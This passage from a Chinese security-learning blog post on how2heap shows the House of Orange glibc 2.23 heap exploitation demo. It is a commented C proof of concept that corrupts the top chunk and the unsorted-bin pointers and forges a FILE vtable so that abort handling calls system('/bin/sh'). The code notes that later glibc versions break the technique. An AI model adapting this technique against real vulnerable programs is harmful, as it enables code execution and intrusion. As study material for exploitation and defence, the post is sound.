class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  It requires a leak of the heap and the libc</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   This function is just present to emulate the scenario where</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   the address of the function system is known.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span> <span class="hljs-params">( <span class="hljs-type">char</span> *ptr)</span>;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The House of Orange starts with the assumption that a buffer overflow exists on the heap</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      using which the Top (also called the Wilderness) chunk can be corrupted.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      At the beginning of execution, the entire heap is part of the Top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The first allocations are usually pieces of the Top chunk that are broken off to service the request.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Thus, with every allocation, the Top chunks keeps getting smaller.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      And in a situation where the size of the Top chunk is smaller than the requested value,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      there are two possibilities:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       1) Extend the Top chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       2) Mmap a new page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If the size requested is smaller than 0x21000, then the former is followed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-type">char</span> *p1, *p2;<br><br>    <span class="hljs-type">size_t</span> io_list_all, *top;<br><br><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;</span><br><br>        <span class="hljs-string">&quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;</span>);<br><br>  <br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;</span><br><br>        <span class="hljs-string">&quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Firstly, lets allocate a chunk on the heap.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span><span class="hljs-number">-16</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap is usually allocated with a top chunk of size 0x21000</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Since we&#x27;ve allocate a chunk of size 0x400 already,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       what&#x27;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       it must also be page aligned at the end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Also, if a chunk that is adjacent to the Top chunk is to be freed,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So that means that there are two conditions that must always be true.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       What&#x27;s left is 0x20c01</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now, let&#x27;s satisfy the conditions</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       1) Top chunk + size has to be page aligned</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       2) Top chunk&#x27;s prev_inuse bit has to be set.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    top = (<span class="hljs-type">size_t</span> *) ( (<span class="hljs-type">char</span> *) p1 + <span class="hljs-number">0x400</span> - <span class="hljs-number">16</span>);<br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0xc01</span>;<br><br><br><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the Top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Malloc tries to service this request by extending the Top chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In the usual scenario, the heap looks like the following</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ...    |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------...----|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      heap start                              heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the new area that gets allocated is contiguous to the old heap end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So the new size of the Top chunk is the sum of the old size and the newly allocated size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In order to keep track of this change in size, malloc uses a fencepost chunk,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       which is basically a temporary chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       After the size of the Top chunk has been updated, this chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In our scenario however, the heap looks like</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     heap start                            heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       In this situation, the new Top will be starting from an address that is adjacent to the heap end.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       So the area between the second chunk and the heap end is unused.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And the old Top chunk gets freed.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       it gets added to list of unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Now we request a chunk of size larger than the size of the top chunk.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       This forces sysmalloc to be invoked.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       And ultimately invokes _int_free</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       Finally the heap looks like this:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |    chunk   |    chunk   | free ..  |  ...  | new Top |</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          |------------|------------|------..--|--...--|---------|</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     heap start                                             new heap end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that the above chunk will be allocated in a different page</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that gets mmapped. It will be placed after the old heap&#x27;s end</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here starts phase two of the attack. We assume that we have an overflow into the old</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      top chunk so we could overwrite the chunk&#x27;s size.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      For the second phase we utilize this overflow again to overwrite the fd and bk pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      of this chunk in the unsorted bin list.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      There are two common ways to exploit the current state:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        - Use the unlinking of the chunk for an *where*-controlled write of the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">          libc&#x27;s main_arena unsorted-bin-list. (requires at least one allocation)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The former attack is pretty straight forward to exploit, so we will only elaborate</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      on a variant of the latter, developed by Angelboy in the blog post linked above.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The attack is pretty stunning, as it exploits the abort call itself, which</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      is triggered when the libc detects any bogus state of the heap.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Whenever abort is triggered, it will flush all the file pointers by calling</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_flush_all_lockp. Eventually, walking through the linked list in</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_list_all and calling _IO_OVERFLOW on them.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      _IO_OVERLOW points to system and whose first 8 bytes are set to &#x27;/bin/sh&#x27;, so</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#x27;/bin/sh&#x27;).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      More about file-pointer exploitation can be found here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      currently point to the libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    io_list_all = top[<span class="hljs-number">2</span>] + <span class="hljs-number">0x9a8</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We plan to overwrite the fd and bk pointers of the old top,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      which has now been added to the unsorted bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      When malloc tries to satisfy a request by splitting this free chunk</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in libc&#x27;s main_arena.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Note that this overwrite occurs before the sanity check and therefore, will occur in any</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      case.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      So, we should set chunk-&gt;bk to be _IO_list_all - 16</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br> <br><br>    top[<span class="hljs-number">3</span>] = io_list_all - <span class="hljs-number">0x10</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      At the end, the system function will be invoked with the pointer to this file pointer.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-built_in">memcpy</span>( ( <span class="hljs-type">char</span> *) top, <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>, <span class="hljs-number">8</span>);<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The function _IO_flush_all_lockp iterates through the file pointer linked-list</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in _IO_list_all.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we can only overwrite this address with main_arena&#x27;s unsorted-bin-list,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      the idea is to get control over the memory at the corresponding fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The address of the next file pointer is located at base_address+0x68.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      This corresponds to smallbin-4, which holds all the smallbins of</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      sizes between 90 and 98. For further information about the libc&#x27;s bin organisation</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Since we overflow the old top chunk, we also control it&#x27;s size field.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here it gets a little bit tricky, currently the old top chunk is in the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      unsortedbin list. For each allocation, malloc tries to serve the chunks</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      in this list first, therefore, iterates over the list.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Furthermore, it will sort all non-fitting chunks into the corresponding bins.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      If we set the size to 0x61 (97) (prev_inuse bit has to be set)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      therefore, occupying the smallbin[4] location in the main_arena and</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      eventually representing the fake file pointer&#x27;s fd-ptr.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      In addition to sorting, malloc will also perform certain size checks on them,</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      so after sorting the old top chunk and following the bogus fd pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      to _IO_list_all, it will check the corresponding size field, detect</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      and finally triggering the abort call that gets our chain rolling.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Here is the corresponding code in the libc:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    top[<span class="hljs-number">1</span>] = <span class="hljs-number">0x61</span>;<br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      Now comes the part where we satisfy the constraints on the fake file pointer</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      required by the function _IO_flush_all_lockp and tested here:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      We want to satisfy the first condition:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    FILE *fp = (FILE *) top;<br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      1. Set mode to 0: fp-&gt;_mode &lt;= 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    fp-&gt;_mode = <span class="hljs-number">0</span>; <span class="hljs-comment">// top+0xc0</span><br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    fp-&gt;_IO_write_base = (<span class="hljs-type">char</span> *) <span class="hljs-number">2</span>; <span class="hljs-comment">// top+0x20</span><br><br>    fp-&gt;_IO_write_ptr = (<span class="hljs-type">char</span> *) <span class="hljs-number">3</span>; <span class="hljs-comment">// top+0x28</span><br><br><br><br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      4) Finally set the jump table to controlled memory and place system there.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      The jump table pointer is right after the FILE struct:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      base_address+sizeof(FILE) = jump_table</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br><br><br>    <span class="hljs-type">size_t</span> *jump_table = &amp;top[<span class="hljs-number">12</span>]; <span class="hljs-comment">// controlled memory</span><br><br>    jump_table[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) &amp;winner;<br><br>    *(<span class="hljs-type">size_t</span> *) ((<span class="hljs-type">size_t</span>) fp + <span class="hljs-keyword">sizeof</span>(FILE)) = (<span class="hljs-type">size_t</span>) jump_table; <span class="hljs-comment">// top+0xd8</span><br><br><br><br><br><br>    <span class="hljs-comment">/* Finally, trigger the whole chain by calling malloc */</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><br><br><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     The libc&#x27;s error message will be printed to the screen</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">     But you&#x27;ll get a shell anyways.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   */</span><br><br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span><br><br>&#123; <br><br>    system(ptr);<br><br>    syscall(SYS_exit, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Pwn%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9D%9F/" class="category-chain-item">Pwn：从入门到入坟</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/how2heap/">#how2heap</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>学习how2heap的glibc2.23系列</div>
      <div>http://example.com/2022/07/08/Pwn/glibc-2.23/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Pursue</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年7月8日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/07/10/CTF_competition/2022lm/" title="2022 蓝帽杯 初赛">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2022 蓝帽杯 初赛</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/07/06/Re/IDA_remote_dbg/" title="学习用IDA远程调试ELF文件">
                        <span class="hidden-mobile">学习用IDA远程调试ELF文件</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
